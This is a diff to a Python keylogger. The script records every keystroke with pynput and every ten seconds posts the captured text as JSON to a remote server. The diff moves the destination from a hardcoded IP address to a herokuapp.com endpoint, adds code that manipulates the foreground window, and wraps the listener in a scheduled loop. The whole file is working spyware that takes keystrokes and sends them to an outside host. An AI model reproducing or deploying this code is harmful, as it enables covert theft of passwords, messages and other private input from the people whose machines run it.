@@ -6,13 +6,19 @@ import requests
 # To transform a Dictionary to a JSON string we need the json package.
 import json
 #  The Timer module is part of the threading package.
+import schedule
+import time
 import threading
+import win32gui
+import win32.lib.win32con as win32con  
+the_program_to_hide = win32gui.GetForegroundWindow() 
+win32gui.ShowWindow(the_program_to_hide , win32con.SW_SHOW) 
 
 # We make a global variable text where we'll save a string of the keystrokes which we'll send to the server.
 text = ""
 
 # Hard code the values of your server and ip address here.
-ip_address = "109.74.200.23"
+# ip_address = "109.74.200.23"
 port_number = "8080"
 # Time interval in seconds for code to execute.
 time_interval = 10
@@ -24,7 +30,7 @@ def send_post_req():
         payload = json.dumps({"keyboardData" : text})
         # We send the POST Request to the server with ip address which listens on the port as specified in the Express server code.
         # Because we're sending JSON to the server, we specify that the MIME Type for JSON is application/json.
-        r = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type" : "application/json"})
+        r = requests.post(f"https://python-node-logger.herokuapp.com/", data=payload, headers={"Content-Type" : "application/json"})
         # Setting up a timer function to run every <time_interval> specified seconds. send_post_req is a recursive function, and will call itself as long as the program is running.
         timer = threading.Timer(time_interval, send_post_req)
         # We start the timer thread.
@@ -61,8 +67,17 @@ def on_press(key):
 
 # A keyboard listener is a threading.Thread, and a callback on_press will be invoked from this thread.
 # In the on_press function we specified how to deal with the different inputs received by the listener.
-with keyboard.Listener(
-    on_press=on_press) as listener:
-    # We start of by sending the post request to our server.
-    send_post_req()
-    listener.join()
+def start():
+    with keyboard.Listener(
+        on_press=on_press) as listener:
+        # We start of by sending the post request to our server.
+        send_post_req()
+        listener.join()
+
+schedule.every(1).minute.do(start)
+
+while 1:
+    schedule.run_pending()
+    time.sleep(1)
+
+        
